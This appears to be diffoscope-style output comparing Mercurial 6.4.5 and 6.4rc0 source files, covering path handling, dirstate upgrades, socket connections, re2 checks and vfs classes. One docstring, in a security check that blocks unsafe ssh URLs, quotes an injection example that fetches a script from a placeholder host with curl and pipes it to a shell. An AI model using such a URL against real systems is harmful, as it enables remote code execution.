+        The original path is available in the `main_path` attribute.
+        """
+        if self.main_path:
+            return self
+        new = self.copy()
+        new.main_path = self
+        if self._pushloc:
+            new._setup_url(self._pushloc)
+        return new
+
+    def pushloc(self):
+        """compatibility layer for the deprecated attributes"""
+        from .. import util  # avoid a cycle
+
+        msg = "don't use path.pushloc, use path.get_push_variant()"
+        util.nouideprecwarn(msg, b"6.5")
+        return self._pushloc
+
+    def _validate_path(self):
+        # When given a raw location but not a symbolic name, validate the
+        # location is valid.
+        if (
+            not self.name
+            and not self.url.scheme
+            and not self._isvalidlocalpath(self.loc)
+        ):
+            raise ValueError(
+                b'location is not a URL or path to a local '
+                b'repo: %s' % self.rawloc
             )
 
-    backupjournal = b"%s.backupfiles" % file
-    if opener.exists(backupjournal):
-        with opener.open(backupjournal) as fp:
-            backupentries = read_backup_files(report, fp)
-    if skip_journal_pattern is not None:
-        keep = lambda x: not skip_journal_pattern.match(x[1])
-        backupentries = [x for x in backupentries if keep(x)]
-
-    _playback(
-        file,
-        report,
-        opener,
-        vfsmap,
-        entries,
-        backupentries,
-        checkambigfiles=checkambigfiles,
-    )
+    def _apply_suboptions(self, ui, sub_options):
+        # Now process the sub-options. If a sub-option is registered, its
+        # attribute will always be present. The value will be None if there
+        # was no valid sub-option.
+        for suboption, (attr, func) in _pathsuboptions.items():
+            if suboption not in sub_options:
+                setattr(self, attr, None)
+                continue
+
+            value = func(ui, self, sub_options[suboption])
+            setattr(self, attr, value)
+
+    def _isvalidlocalpath(self, path):
+        """Returns True if the given path is a potentially valid repository.
+        This is its own function so that extensions can change the definition of
+        'valid' in this case (like when pulling from a git repo into a hg
+        one)."""
+        try:
+            return os.path.isdir(os.path.join(path, b'.hg'))
+        # Python 2 may return TypeError. Python 3, ValueError.
+        except (TypeError, ValueError):
+            return False
+
+    @property
+    def suboptions(self):
+        """Return sub-options and their values for this path.
+
+        This is intended to be used for presentation purposes.
+        """
+        d = {}
+        for subopt, (attr, _func) in _pathsuboptions.items():
+            value = getattr(self, attr)
+            if value is not None:
+                d[subopt] = value
+        return d
```

### Comparing `mercurial-6.4.5/mercurial/treediscovery.py` & `mercurial-6.4rc0/mercurial/treediscovery.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/txnutil.py` & `mercurial-6.4rc0/mercurial/txnutil.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/typelib.py` & `mercurial-6.4rc0/mercurial/typelib.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/ui.py` & `mercurial-6.4rc0/mercurial/ui.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/unionrepo.py` & `mercurial-6.4rc0/mercurial/unionrepo.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/upgrade.py` & `mercurial-6.4rc0/mercurial/upgrade.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/upgrade_utils/actions.py` & `mercurial-6.4rc0/mercurial/upgrade_utils/actions.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/upgrade_utils/auto_upgrade.py` & `mercurial-6.4rc0/mercurial/upgrade_utils/auto_upgrade.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/upgrade_utils/engine.py` & `mercurial-6.4rc0/mercurial/upgrade_utils/engine.py`

 * *Files 2% similar despite different names*

```diff
@@ -651,34 +651,28 @@
             )
         except FileNotFoundError:
             # The dirstate does not exist on an empty repo or a repo with no
             # revision checked out
             pass
 
     assert srcrepo.dirstate._use_dirstate_v2 == (old == b'v2')
-    use_v2 = new == b'v2'
-    if use_v2:
-        # Write the requirements *before* upgrading
-        scmutil.writereporequirements(srcrepo, upgrade_op.new_requirements)
-
     srcrepo.dirstate._map.preload()
-    srcrepo.dirstate._use_dirstate_v2 = use_v2
-    srcrepo.dirstate._map._use_dirstate_v2 = use_v2
+    srcrepo.dirstate._use_dirstate_v2 = new == b'v2'
+    srcrepo.dirstate._map._use_dirstate_v2 = srcrepo.dirstate._use_dirstate_v2
     srcrepo.dirstate._dirty = True
     try:
         srcrepo.vfs.unlink(b'dirstate')
     except FileNotFoundError:
         # The dirstate does not exist on an empty repo or a repo with no
         # revision checked out
         pass
 
     srcrepo.dirstate.write(None)
-    if not use_v2:
-        # Remove the v2 requirement *after* downgrading
-        scmutil.writereporequirements(srcrepo, upgrade_op.new_requirements)
+
+    scmutil.writereporequirements(srcrepo, upgrade_op.new_requirements)
 
 
 def upgrade_tracked_hint(ui, srcrepo, upgrade_op, add):
     if add:
         srcrepo.dirstate._use_tracked_hint = True
         srcrepo.dirstate._dirty = True
         srcrepo.dirstate._dirty_tracked_set = True
```

### Comparing `mercurial-6.4.5/mercurial/url.py` & `mercurial-6.4rc0/mercurial/url.py`

 * *Files 2% similar despite different names*

```diff
@@ -323,17 +323,15 @@
             **kwargs
         ):
             keepalive.HTTPConnection.__init__(self, host, port, *args, **kwargs)
             self.key_file = key_file
             self.cert_file = cert_file
 
         def connect(self):
-            self.sock = socket.create_connection(
-                (self.host, self.port), self.timeout
-            )
+            self.sock = socket.create_connection((self.host, self.port))
 
             host = self.host
             realhostport = self.realhostport  # pytype: disable=attribute-error
             if realhostport:  # use CONNECT proxy
                 _generic_proxytunnel(self)
                 host = realhostport.rsplit(b':', 1)[0]
             self.sock = sslutil.wrapsocket(
```

### Comparing `mercurial-6.4.5/mercurial/urllibcompat.py` & `mercurial-6.4rc0/mercurial/urllibcompat.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/util.py` & `mercurial-6.4rc0/mercurial/util.py`

 * *Files 1% similar despite different names*

```diff
@@ -2206,29 +2206,18 @@
     import re2  # pytype: disable=import-error
 
     _re2 = None
 except ImportError:
     _re2 = False
 
 
-def has_re2():
-    """return True is re2 is available, False otherwise"""
-    if _re2 is None:
-        _re._checkre2()
-    return _re2
-
-
 class _re:
-    @staticmethod
-    def _checkre2():
+    def _checkre2(self):
         global _re2
         global _re2_input
-        if _re2 is not None:
-            # we already have the answer
-            return
 
         check_pattern = br'\[([^\[]+)\]'
         check_input = b'[ui]'
         try:
             # check if match works, see issue3964
             _re2 = bool(re2.match(check_pattern, check_input))
         except ImportError:
```

### Comparing `mercurial-6.4.5/mercurial/utils/cborutil.py` & `mercurial-6.4rc0/mercurial/utils/cborutil.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/utils/compression.py` & `mercurial-6.4rc0/mercurial/utils/compression.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/utils/dateutil.py` & `mercurial-6.4rc0/mercurial/utils/dateutil.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/utils/memorytop.py` & `mercurial-6.4rc0/mercurial/utils/memorytop.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/utils/procutil.py` & `mercurial-6.4rc0/mercurial/utils/procutil.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/utils/repoviewutil.py` & `mercurial-6.4rc0/mercurial/utils/repoviewutil.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/utils/resourceutil.py` & `mercurial-6.4rc0/mercurial/utils/resourceutil.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/utils/storageutil.py` & `mercurial-6.4rc0/mercurial/utils/storageutil.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/utils/stringutil.py` & `mercurial-6.4rc0/mercurial/utils/stringutil.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/mercurial/utils/urlutil.py` & `mercurial-6.4rc0/mercurial/vfs.py`

 * *Files 26% similar despite different names*

```diff
@@ -1,978 +1,813 @@
-# utils.urlutil - code related to [paths] management
+# vfs.py - Mercurial 'vfs' classes
 #
-# Copyright 2005-2023 Olivia Mackall <olivia@selenic.com> and others
+#  Copyright Olivia Mackall <olivia@selenic.com>
 #
 # This software may be used and distributed according to the terms of the
 # GNU General Public License version 2 or any later version.
+
+import contextlib
 import os
-import re as remod
-import socket
+import shutil
+import stat
+import threading
+
+from typing import (
+    Optional,
+)
 
-from ..i18n import _
-from ..pycompat import (
+from .i18n import _
+from .pycompat import (
+    delattr,
     getattr,
     setattr,
 )
-from .. import (
+from . import (
     encoding,
     error,
+    pathutil,
     pycompat,
-    urllibcompat,
+    util,
 )
 
-from . import (
-    stringutil,
-)
 
-from ..revlogutils import (
-    constants as revlog_constants,
-)
+def _avoidambig(path: bytes, oldstat):
+    """Avoid file stat ambiguity forcibly
 
+    This function causes copying ``path`` file, if it is owned by
+    another (see issue5418 and issue5584 for detail).
+    """
 
-if pycompat.TYPE_CHECKING:
-    from typing import (
-        Union,
-    )
+    def checkandavoid():
+        newstat = util.filestat.frompath(path)
+        # return whether file stat ambiguity is (already) avoided
+        return not newstat.isambig(oldstat) or newstat.avoidambig(path, oldstat)
+
+    if not checkandavoid():
+        # simply copy to change owner of path to get privilege to
+        # advance mtime (see issue5418)
+        util.rename(util.mktempcopy(path), path)
+        checkandavoid()
+
+
+class abstractvfs:
+    """Abstract base class; cannot be instantiated"""
+
+    # default directory separator for vfs
+    #
+    # Other vfs code always use `/` and this works fine because python file API
+    # abstract the use of `/` and make it work transparently. For consistency
+    # vfs will always use `/` when joining. This avoid some confusion in
+    # encoded vfs (see issue6546)
+    _dir_sep = b'/'
+
+    def __init__(self, *args, **kwargs):
+        '''Prevent instantiation; don't call this from subclasses.'''
+        raise NotImplementedError('attempted instantiating ' + str(type(self)))
+
+    # TODO: type return, which is util.posixfile wrapped by a proxy
+    def __call__(self, path: bytes, mode: bytes = b'rb', **kwargs):
+        raise NotImplementedError
 
-urlreq = urllibcompat.urlreq
+    def _auditpath(self, path: bytes, mode: bytes):
+        raise NotImplementedError
 
+    def join(self, path: Optional[bytes], *insidef: bytes) -> bytes:
+        raise NotImplementedError
 
-def getport(port):
-    # type: (Union[bytes, int]) -> int
-    """Return the port for a given network service.
+    def tryread(self, path: bytes) -> bytes:
+        '''gracefully return an empty string for missing files'''
+        try:
+            return self.read(path)
+        except FileNotFoundError:
+            pass
+        return b""
 
-    If port is an integer, it's returned as is. If it's a string, it's
-    looked up using socket.getservbyname(). If there's no matching
-    service, error.Abort is raised.
-    """
-    try:
-        return int(port)
-    except ValueError:
-        pass
-
-    try:
-        return socket.getservbyname(pycompat.sysstr(port))
-    except socket.error:
-        raise error.Abort(
-            _(b"no port number associated with service '%s'") % port
-        )
+    def tryreadlines(self, path: bytes, mode: bytes = b'rb'):
+        '''gracefully return an empty array for missing files'''
+        try:
+            return self.readlines(path, mode=mode)
+        except FileNotFoundError:
+            pass
+        return []
+
+    @util.propertycache
+    def open(self):
+        """Open ``path`` file, which is relative to vfs root.
+
+        Newly created directories are marked as "not to be indexed by
+        the content indexing service", if ``notindexed`` is specified
+        for "write" mode access.
+        """
+        return self.__call__
 
+    def read(self, path: bytes) -> bytes:
+        with self(path, b'rb') as fp:
+            return fp.read()
 
-class url:
-    r"""Reliable URL parser.
+    def readlines(self, path: bytes, mode: bytes = b'rb'):
+        with self(path, mode=mode) as fp:
+            return fp.readlines()
 
-    This parses URLs and provides attributes for the following
-    components:
+    def write(
+        self, path: bytes, data: bytes, backgroundclose=False, **kwargs
+    ) -> int:
+        with self(path, b'wb', backgroundclose=backgroundclose, **kwargs) as fp:
+            return fp.write(data)
 
-    <scheme>://<user>:<passwd>@<host>:<port>/<path>?<query>#<fragment>
+    def writelines(
+        self, path: bytes, data: bytes, mode: bytes = b'wb', notindexed=False
+    ) -> None:
+        with self(path, mode=mode, notindexed=notindexed) as fp:
+            return fp.writelines(data)
 
-    Missing components are set to None. The only exception is
-    fragment, which is set to '' if present but empty.
-
-    If parsefragment is False, fragment is included in query. If
-    parsequery is False, query is included in path. If both are
-    False, both fragment and query are included in path.
-
-    See http://www.ietf.org/rfc/rfc2396.txt for more information.
-
-    Note that for backward compatibility reasons, bundle URLs do not
-    take host names. That means 'bundle://../' has a path of '../'.
-
-    Examples:
-
-    >>> url(b'http://www.ietf.org/rfc/rfc2396.txt')
-    <url scheme: 'http', host: 'www.ietf.org', path: 'rfc/rfc2396.txt'>
-    >>> url(b'ssh://[::1]:2200//home/joe/repo')
-    <url scheme: 'ssh', host: '[::1]', port: '2200', path: '/home/joe/repo'>
-    >>> url(b'file:///home/joe/repo')
-    <url scheme: 'file', path: '/home/joe/repo'>
-    >>> url(b'file:///c:/temp/foo/')
-    <url scheme: 'file', path: 'c:/temp/foo/'>
-    >>> url(b'bundle:foo')
-    <url scheme: 'bundle', path: 'foo'>
-    >>> url(b'bundle://../foo')
-    <url scheme: 'bundle', path: '../foo'>
-    >>> url(br'c:\foo\bar')
-    <url path: 'c:\\foo\\bar'>
-    >>> url(br'\\blah\blah\blah')
-    <url path: '\\\\blah\\blah\\blah'>
-    >>> url(br'\\blah\blah\blah#baz')
-    <url path: '\\\\blah\\blah\\blah', fragment: 'baz'>
-    >>> url(br'file:///C:\users\me')
-    <url scheme: 'file', path: 'C:\\users\\me'>
-
-    Authentication credentials:
-
-    >>> url(b'ssh://joe:xyz@x/repo')
-    <url scheme: 'ssh', user: 'joe', passwd: 'xyz', host: 'x', path: 'repo'>
-    >>> url(b'ssh://joe@x/repo')
-    <url scheme: 'ssh', user: 'joe', host: 'x', path: 'repo'>
-
-    Query strings and fragments:
-
-    >>> url(b'http://host/a?b#c')
-    <url scheme: 'http', host: 'host', path: 'a', query: 'b', fragment: 'c'>
-    >>> url(b'http://host/a?b#c', parsequery=False, parsefragment=False)
-    <url scheme: 'http', host: 'host', path: 'a?b#c'>
-
-    Empty path:
-
-    >>> url(b'')
-    <url path: ''>
-    >>> url(b'#a')
-    <url path: '', fragment: 'a'>
-    >>> url(b'http://host/')
-    <url scheme: 'http', host: 'host', path: ''>
-    >>> url(b'http://host/#a')
-    <url scheme: 'http', host: 'host', path: '', fragment: 'a'>
+    def append(self, path: bytes, data: bytes) -> int:
+        with self(path, b'ab') as fp:
+            return fp.write(data)
 
-    Only scheme:
+    def basename(self, path: bytes) -> bytes:
+        """return base element of a path (as os.path.basename would do)
 
-    >>> url(b'http:')
-    <url scheme: 'http'>
-    """
+        This exists to allow handling of strange encoding if needed."""
+        return os.path.basename(path)
 
-    _safechars = b"!~*'()+"
-    _safepchars = b"/!~*'()+:\\"
-    _matchscheme = remod.compile(b'^[a-zA-Z0-9+.\\-]+:').match
-
-    def __init__(self, path, parsequery=True, parsefragment=True):
-        # type: (bytes, bool, bool) -> None
-        # We slowly chomp away at path until we have only the path left
-        self.scheme = self.user = self.passwd = self.host = None
-        self.port = self.path = self.query = self.fragment = None
-        self._localpath = True
-        self._hostport = b''
-        self._origpath = path
-
-        if parsefragment and b'#' in path:
-            path, self.fragment = path.split(b'#', 1)
-
-        # special case for Windows drive letters and UNC paths
-        if hasdriveletter(path) or path.startswith(b'\\\\'):
-            self.path = path
-            return
+    def chmod(self, path: bytes, mode: int) -> None:
+        return os.chmod(self.join(path), mode)
 
-        # For compatibility reasons, we can't handle bundle paths as
-        # normal URLS
-        if path.startswith(b'bundle:'):
-            self.scheme = b'bundle'
-            path = path[7:]
-            if path.startswith(b'//'):
-                path = path[2:]
-            self.path = path
-            return
+    def dirname(self, path: bytes) -> bytes:
+        """return dirname element of a path (as os.path.dirname would do)
 
-        if self._matchscheme(path):
-            parts = path.split(b':', 1)
-            if parts[0]:
-                self.scheme, path = parts
-                self._localpath = False
-
-        if not path:
-            path = None
-            if self._localpath:
-                self.path = b''
-                return
-        else:
-            if self._localpath:
-                self.path = path
-                return
-
-            if parsequery and b'?' in path:
-                path, self.query = path.split(b'?', 1)
-                if not path:
-                    path = None
-                if not self.query:
-                    self.query = None
-
-            # // is required to specify a host/authority
-            if path and path.startswith(b'//'):
-                parts = path[2:].split(b'/', 1)
-                if len(parts) > 1:
-                    self.host, path = parts
-                else:
-                    self.host = parts[0]
-                    path = None
-                if not self.host:
-                    self.host = None
-                    # path of file:///d is /d
-                    # path of file:///d:/ is d:/, not /d:/
-                    if path and not hasdriveletter(path):
-                        path = b'/' + path
-
-            if self.host and b'@' in self.host:
-                self.user, self.host = self.host.rsplit(b'@', 1)
-                if b':' in self.user:
-                    self.user, self.passwd = self.user.split(b':', 1)
-                if not self.host:
-                    self.host = None
+        This exists to allow handling of strange encoding if needed."""
+        return os.path.dirname(path)
 
-            # Don't split on colons in IPv6 addresses without ports
-            if (
-                self.host
-                and b':' in self.host
-                and not (
-                    self.host.startswith(b'[') and self.host.endswith(b']')
-                )
-            ):
-                self._hostport = self.host
-                self.host, self.port = self.host.rsplit(b':', 1)
-                if not self.host:
-                    self.host = None
+    def exists(self, path: Optional[bytes] = None) -> bool:
+        return os.path.exists(self.join(path))
 
-            if (
-                self.host
-                and self.scheme == b'file'
-                and self.host not in (b'localhost', b'127.0.0.1', b'[::1]')
-            ):
-                raise error.Abort(
-                    _(b'file:// URLs can only refer to localhost')
-                )
+    def fstat(self, fp):
+        return util.fstat(fp)
 
-        self.path = path
+    def isdir(self, path: Optional[bytes] = None) -> bool:
+        return os.path.isdir(self.join(path))
 
-        # leave the query string escaped
-        for a in (b'user', b'passwd', b'host', b'port', b'path', b'fragment'):
-            v = getattr(self, a)
-            if v is not None:
-                setattr(self, a, urlreq.unquote(v))
-
-    def copy(self):
-        u = url(b'temporary useless value')
-        u.path = self.path
-        u.scheme = self.scheme
-        u.user = self.user
-        u.passwd = self.passwd
-        u.host = self.host
-        u.port = self.port
-        u.query = self.query
-        u.fragment = self.fragment
-        u._localpath = self._localpath
-        u._hostport = self._hostport
-        u._origpath = self._origpath
-        return u
-
-    @encoding.strmethod
-    def __repr__(self):
-        attrs = []
-        for a in (
-            b'scheme',
-            b'user',
-            b'passwd',
-            b'host',
-            b'port',
-            b'path',
-            b'query',
-            b'fragment',
-        ):
-            v = getattr(self, a)
-            if v is not None:
-                attrs.append(b'%s: %r' % (a, pycompat.bytestr(v)))
-        return b'<url %s>' % b', '.join(attrs)
-
-    def __bytes__(self):
-        r"""Join the URL's components back into a URL string.
-
-        Examples:
-
-        >>> bytes(url(b'http://user:pw@host:80/c:/bob?fo:oo#ba:ar'))
-        'http://user:pw@host:80/c:/bob?fo:oo#ba:ar'
-        >>> bytes(url(b'http://user:pw@host:80/?foo=bar&baz=42'))
-        'http://user:pw@host:80/?foo=bar&baz=42'
-        >>> bytes(url(b'http://user:pw@host:80/?foo=bar%3dbaz'))
-        'http://user:pw@host:80/?foo=bar%3dbaz'
-        >>> bytes(url(b'ssh://user:pw@[::1]:2200//home/joe#'))
-        'ssh://user:pw@[::1]:2200//home/joe#'
-        >>> bytes(url(b'http://localhost:80//'))
-        'http://localhost:80//'
-        >>> bytes(url(b'http://localhost:80/'))
-        'http://localhost:80/'
-        >>> bytes(url(b'http://localhost:80'))
-        'http://localhost:80/'
-        >>> bytes(url(b'bundle:foo'))
-        'bundle:foo'
-        >>> bytes(url(b'bundle://../foo'))
-        'bundle:../foo'
-        >>> bytes(url(b'path'))
-        'path'
-        >>> bytes(url(b'file:///tmp/foo/bar'))
-        'file:///tmp/foo/bar'
-        >>> bytes(url(b'file:///c:/tmp/foo/bar'))
-        'file:///c:/tmp/foo/bar'
-        >>> print(url(br'bundle:foo\bar'))
-        bundle:foo\bar
-        >>> print(url(br'file:///D:\data\hg'))
-        file:///D:\data\hg
-        """
-        if self._localpath:
-            s = self.path
-            if self.scheme == b'bundle':
-                s = b'bundle:' + s
-            if self.fragment:
-                s += b'#' + self.fragment
-            return s
-
-        s = self.scheme + b':'
-        if self.user or self.passwd or self.host:
-            s += b'//'
-        elif self.scheme and (
-            not self.path
-            or self.path.startswith(b'/')
-            or hasdriveletter(self.path)
-        ):
-            s += b'//'
-            if hasdriveletter(self.path):
-                s += b'/'
-        if self.user:
-            s += urlreq.quote(self.user, safe=self._safechars)
-        if self.passwd:
-            s += b':' + urlreq.quote(self.passwd, safe=self._safechars)
-        if self.user or self.passwd:
-            s += b'@'
-        if self.host:
-            if not (self.host.startswith(b'[') and self.host.endswith(b']')):
-                s += urlreq.quote(self.host)
-            else:
-                s += self.host
-        if self.port:
-            s += b':' + urlreq.quote(self.port)
-        if self.host:
-            s += b'/'
-        if self.path:
-            # TODO: similar to the query string, we should not unescape the
-            # path when we store it, the path might contain '%2f' = '/',
-            # which we should *not* escape.
-            s += urlreq.quote(self.path, safe=self._safepchars)
-        if self.query:
-            # we store the query in escaped form.
-            s += b'?' + self.query
-        if self.fragment is not None:
-            s += b'#' + urlreq.quote(self.fragment, safe=self._safepchars)
-        return s
+    def isfile(self, path: Optional[bytes] = None) -> bool:
+        return os.path.isfile(self.join(path))
 
-    __str__ = encoding.strmethod(__bytes__)
+    def islink(self, path: Optional[bytes] = None) -> bool:
+        return os.path.islink(self.join(path))
 
-    def authinfo(self):
-        user, passwd = self.user, self.passwd
+    def isfileorlink(self, path: Optional[bytes] = None) -> bool:
+        """return whether path is a regular file or a symlink
+
+        Unlike isfile, this doesn't follow symlinks."""
         try:
-            self.user, self.passwd = None, None
-            s = bytes(self)
-        finally:
-            self.user, self.passwd = user, passwd
-        if not self.user:
-            return (s, None)
-        # authinfo[1] is passed to urllib2 password manager, and its
-        # URIs must not contain credentials. The host is passed in the
-        # URIs list because Python < 2.4.3 uses only that to search for
-        # a password.
-        return (s, (None, (s, self.host), self.user, self.passwd or b''))
-
-    def isabs(self):
-        if self.scheme and self.scheme != b'file':
-            return True  # remote URL
-        if hasdriveletter(self.path):
-            return True  # absolute for our purposes - can't be joined()
-        if self.path.startswith(br'\\'):
-            return True  # Windows UNC path
-        if self.path.startswith(b'/'):
-            return True  # POSIX-style
-        return False
-
-    def localpath(self):
-        # type: () -> bytes
-        if self.scheme == b'file' or self.scheme == b'bundle':
-            path = self.path or b'/'
-            # For Windows, we need to promote hosts containing drive
-            # letters to paths with drive letters.
-            if hasdriveletter(self._hostport):
-                path = self._hostport + b'/' + self.path
-            elif (
-                self.host is not None and self.path and not hasdriveletter(path)
-            ):
-                path = b'/' + path
-            return path
-        return self._origpath
-
-    def islocal(self):
-        '''whether localpath will return something that posixfile can open'''
-        return (
-            not self.scheme
-            or self.scheme == b'file'
-            or self.scheme == b'bundle'
+            st = self.lstat(path)
+        except OSError:
+            return False
+        mode = st.st_mode
+        return stat.S_ISREG(mode) or stat.S_ISLNK(mode)
+
+    def _join(self, *paths: bytes) -> bytes:
+        root_idx = 0
+        for idx, p in enumerate(paths):
+            if os.path.isabs(p) or p.startswith(self._dir_sep):
+                root_idx = idx
+        if root_idx != 0:
+            paths = paths[root_idx:]
+        paths = [p for p in paths if p]
+        return self._dir_sep.join(paths)
+
+    def reljoin(self, *paths: bytes) -> bytes:
+        """join various elements of a path together (as os.path.join would do)
+
+        The vfs base is not injected so that path stay relative. This exists
+        to allow handling of strange encoding if needed."""
+        return self._join(*paths)
+
+    def split(self, path: bytes):
+        """split top-most element of a path (as os.path.split would do)
+
+        This exists to allow handling of strange encoding if needed."""
+        return os.path.split(path)
+
+    def lexists(self, path: Optional[bytes] = None) -> bool:
+        return os.path.lexists(self.join(path))
+
+    def lstat(self, path: Optional[bytes] = None):
+        return os.lstat(self.join(path))
+
+    def listdir(self, path: Optional[bytes] = None):
+        return os.listdir(self.join(path))
+
+    def makedir(self, path: Optional[bytes] = None, notindexed=True):
+        return util.makedir(self.join(path), notindexed)
+
+    def makedirs(
+        self, path: Optional[bytes] = None, mode: Optional[int] = None
+    ):
+        return util.makedirs(self.join(path), mode)
+
+    def makelock(self, info, path: bytes):
+        return util.makelock(info, self.join(path))
+
+    def mkdir(self, path: Optional[bytes] = None):
+        return os.mkdir(self.join(path))
+
+    def mkstemp(
+        self,
+        suffix: bytes = b'',
+        prefix: bytes = b'tmp',
+        dir: Optional[bytes] = None,
+    ):
+        fd, name = pycompat.mkstemp(
+            suffix=suffix, prefix=prefix, dir=self.join(dir)
         )
+        dname, fname = util.split(name)
+        if dir:
+            return fd, os.path.join(dir, fname)
+        else:
+            return fd, fname
 
+    def readdir(self, path: Optional[bytes] = None, stat=None, skip=None):
+        return util.listdir(self.join(path), stat, skip)
 
-def hasscheme(path):
-    # type: (bytes) -> bool
-    return bool(url(path).scheme)  # cast to help pytype
+    def readlock(self, path: bytes) -> bytes:
+        return util.readlock(self.join(path))
 
+    def rename(self, src: bytes, dst: bytes, checkambig=False):
+        """Rename from src to dst
 
-def hasdriveletter(path):
-    # type: (bytes) -> bool
-    return bool(path) and path[1:2] == b':' and path[0:1].isalpha()
+        checkambig argument is used with util.filestat, and is useful
+        only if destination file is guarded by any lock
+        (e.g. repo.lock or repo.wlock).
 
+        To avoid file stat ambiguity forcibly, checkambig=True involves
+        copying ``src`` file, if it is owned by another. Therefore, use
+        checkambig=True only in limited cases (see also issue5418 and
+        issue5584 for detail).
+        """
+        self._auditpath(dst, b'w')
+        srcpath = self.join(src)
+        dstpath = self.join(dst)
+        oldstat = checkambig and util.filestat.frompath(dstpath)
+        if oldstat and oldstat.stat:
+            ret = util.rename(srcpath, dstpath)
+            _avoidambig(dstpath, oldstat)
+            return ret
+        return util.rename(srcpath, dstpath)
+
+    def readlink(self, path: bytes) -> bytes:
+        return util.readlink(self.join(path))
+
+    def removedirs(self, path: Optional[bytes] = None):
+        """Remove a leaf directory and all empty intermediate ones"""
+        return util.removedirs(self.join(path))
+
+    def rmdir(self, path: Optional[bytes] = None):
+        """Remove an empty directory."""
+        return os.rmdir(self.join(path))
 
-def urllocalpath(path):
-    # type: (bytes) -> bytes
-    return url(path, parsequery=False, parsefragment=False).localpath()
+    def rmtree(
+        self, path: Optional[bytes] = None, ignore_errors=False, forcibly=False
+    ):
+        """Remove a directory tree recursively
+
+        If ``forcibly``, this tries to remove READ-ONLY files, too.
+        """
+        if forcibly:
+
+            def onerror(function, path, excinfo):
+                if function is not os.remove:
+                    raise
+                # read-only files cannot be unlinked under Windows
+                s = os.stat(path)
+                if (s.st_mode & stat.S_IWRITE) != 0:
+                    raise
+                os.chmod(path, stat.S_IMODE(s.st_mode) | stat.S_IWRITE)
+                os.remove(path)
 
+        else:
+            onerror = None
+        return shutil.rmtree(
+            self.join(path), ignore_errors=ignore_errors, onerror=onerror
+        )
 
-def checksafessh(path):
-    # type: (bytes) -> None
-    """check if a path / url is a potentially unsafe ssh exploit (SEC)
+    def setflags(self, path: bytes, l: bool, x: bool):
+        return util.setflags(self.join(path), l, x)
 
-    This is a sanity check for ssh urls. ssh will parse the first item as
-    an option; e.g. ssh://-oProxyCommand=curl${IFS}bad.server|sh/path.
-    Let's prevent these potentially exploited urls entirely and warn the
-    user.
+    def stat(self, path: Optional[bytes] = None):
+        return os.stat(self.join(path))
 
-    Raises an error.Abort when the url is unsafe.
-    """
-    path = urlreq.unquote(path)
-    if path.startswith(b'ssh://-') or path.startswith(b'svn+ssh://-'):
-        raise error.Abort(
-            _(b'potentially unsafe url: %r') % (pycompat.bytestr(path),)
+    def unlink(self, path: Optional[bytes] = None):
+        return util.unlink(self.join(path))
+
+    def tryunlink(self, path: Optional[bytes] = None):
+        """Attempt to remove a file, ignoring missing file errors."""
+        util.tryunlink(self.join(path))
+
+    def unlinkpath(
+        self, path: Optional[bytes] = None, ignoremissing=False, rmdir=True
+    ):
+        return util.unlinkpath(
+            self.join(path), ignoremissing=ignoremissing, rmdir=rmdir
         )
 
+    def utime(self, path: Optional[bytes] = None, t=None):
+        return os.utime(self.join(path), t)
 
-def hidepassword(u):
-    # type: (bytes) -> bytes
-    '''hide user credential in a url string'''
-    u = url(u)
-    if u.passwd:
-        u.passwd = b'***'
-    return bytes(u)
-
-
-def removeauth(u):
-    # type: (bytes) -> bytes
-    '''remove all authentication information from a url string'''
-    u = url(u)
-    u.user = u.passwd = None
-    return bytes(u)
-
-
-def list_paths(ui, target_path=None):
-    """list all the (name, paths) in the passed ui"""
-    result = []
-    if target_path is None:
-        for name, paths in sorted(ui.paths.items()):
-            for p in paths:
-                result.append((name, p))
-
-    else:
-        for path in ui.paths.get(target_path, []):
-            result.append((target_path, path))
-    return result
+    def walk(self, path: Optional[bytes] = None, onerror=None):
+        """Yield (dirpath, dirs, files) tuple for each directories under path
 
+        ``dirpath`` is relative one from the root of this vfs. This
+        uses ``os.sep`` as path separator, even you specify POSIX
+        style ``path``.
 
-def try_path(ui, url):
-    """try to build a path from a url
+        "The root of this vfs" is represented as empty ``dirpath``.
+        """
+        root = os.path.normpath(self.join(None))
+        # when dirpath == root, dirpath[prefixlen:] becomes empty
+        # because len(dirpath) < prefixlen.
+        prefixlen = len(pathutil.normasprefix(root))
+        for dirpath, dirs, files in os.walk(self.join(path), onerror=onerror):
+            yield (dirpath[prefixlen:], dirs, files)
+
+    @contextlib.contextmanager
+    def backgroundclosing(self, ui, expectedcount=-1):
+        """Allow files to be closed asynchronously.
+
+        When this context manager is active, ``backgroundclose`` can be passed
+        to ``__call__``/``open`` to result in the file possibly being closed
+        asynchronously, on a background thread.
+        """
+        # Sharing backgroundfilecloser between threads is complex and using
+        # multiple instances puts us at risk of running out of file descriptors
+        # only allow to use backgroundfilecloser when in main thread.
+        if not isinstance(
+            threading.current_thread(),
+            threading._MainThread,  # pytype: disable=module-attr
+        ):
+            yield
+            return
+        vfs = getattr(self, 'vfs', self)
+        if getattr(vfs, '_backgroundfilecloser', None):
+            raise error.Abort(
+                _(b'can only have 1 active background file closer')
+            )
 
-    Return None if no Path could built.
+        with backgroundfilecloser(ui, expectedcount=expectedcount) as bfc:
+            try:
+                vfs._backgroundfilecloser = (
+                    bfc  # pytype: disable=attribute-error
+                )
+                yield bfc
+            finally:
+                vfs._backgroundfilecloser = (
+                    None  # pytype: disable=attribute-error
+                )
